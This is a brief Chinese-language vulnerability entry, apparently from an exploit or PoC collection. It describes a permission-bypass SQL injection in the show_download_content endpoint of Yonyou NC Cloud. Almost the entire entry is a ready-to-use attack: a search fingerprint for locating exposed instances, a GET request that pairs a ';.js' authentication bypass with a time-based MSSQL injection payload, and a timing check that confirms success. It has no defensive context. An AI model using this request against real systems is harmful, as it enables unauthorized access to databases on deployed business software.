# 用友NCCloudshow_download_content接口权限绕过存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY'0:0:5'--+ HTTP/1.1`
- **响应特征**：200 响应时间>=5s